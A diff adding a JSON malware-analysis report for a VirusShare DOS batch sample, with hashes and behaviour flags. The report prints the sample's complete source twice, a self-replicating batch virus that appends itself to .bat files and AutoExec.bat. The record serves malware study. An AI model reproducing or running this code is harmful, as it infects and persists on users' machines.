@@ -1,0 +1,56 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "AUTOEXEC": "Runs when the Word document is opened",
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "@echo off%[MaLK]%\nif exist \\noway goto MaLK\nif not exist %0.bat goto MaLK\nif %0==AUTOEXEC goto MaLKAuto\nfor %%f in (*.bat) do set MaLK=%%f\nfind /i \"MaLK\"<%MaLK%>nul\nif errorlevel 1 find \"MaLK\"<%0.bat>>%MaLK%\nfor %%f in (\\*.bat) do set MaLK=%%f\nfind /i \"MaLK\"<%MaLK%>nul\nif errorlevel 1 find \"MaLK\"<%0.bat>>%MaLK%\nfor %%f in (c:\\*.bat) do set MaLK=%%f\nfind /i \"MaLK\"<%MaLK%>nul\nif errorlevel 1 find \"MaLK\"<%0.bat>>%MaLK%\n:MaLK\nfor %%f in (c:\\AutoExec.bat) do set MaLK=%%f\nfind /i \"MaLK\"<%MaLK%>nul\nif errorlevel 1 find \"MaLK\"<%0.bat>>%MaLK%\n:MaLKAuto\nfor %%f in (*.bat \\Windows\\*.bat \\Dos\\*.bat) do set MaLK=%%f\nfind /i \"MaLK\"<%MaLK%>nul\nif errorlevel 1 find \"MaLK\"<%0.bat>>%MaLK%"
+    },
+    "filename": "VirusShare_8dc10d60ecd3b4fd0bdb14eacc50c534",
+    "filesize": 701,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "8dc10d60ecd3b4fd0bdb14eacc50c534",
+        "sha1": "6497573a4dcfa8cdb73eb40d5c5e692d06778f57",
+        "sha256": "112cfc43be3dd0103d561a22aa6c61e8f9820e0b1aad1df45757cbcb5fe4e20a"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off%[MaLK]%",
+            "if exist \\noway goto MaLK",
+            "if not exist %0.bat goto MaLK",
+            "if %0==AUTOEXEC goto MaLKAuto",
+            "for %%f in (*.bat) do set MaLK=%%f",
+            "find /i \"MaLK\"<%MaLK%>nul",
+            "if errorlevel 1 find \"MaLK\"<%0.bat>>%MaLK%",
+            "for %%f in (\\*.bat) do set MaLK=%%f",
+            "find /i \"MaLK\"<%MaLK%>nul",
+            "if errorlevel 1 find \"MaLK\"<%0.bat>>%MaLK%",
+            "for %%f in (c:\\*.bat) do set MaLK=%%f",
+            "find /i \"MaLK\"<%MaLK%>nul",
+            "if errorlevel 1 find \"MaLK\"<%0.bat>>%MaLK%",
+            ":MaLK",
+            "for %%f in (c:\\AutoExec.bat) do set MaLK=%%f",
+            "find /i \"MaLK\"<%MaLK%>nul",
+            "if errorlevel 1 find \"MaLK\"<%0.bat>>%MaLK%",
+            ":MaLKAuto",
+            "for %%f in (*.bat \\Windows\\*.bat \\Dos\\*.bat) do set MaLK=%%f",
+            "find /i \"MaLK\"<%MaLK%>nul",
+            "if errorlevel 1 find \"MaLK\"<%0.bat>>%MaLK%"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.291209",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
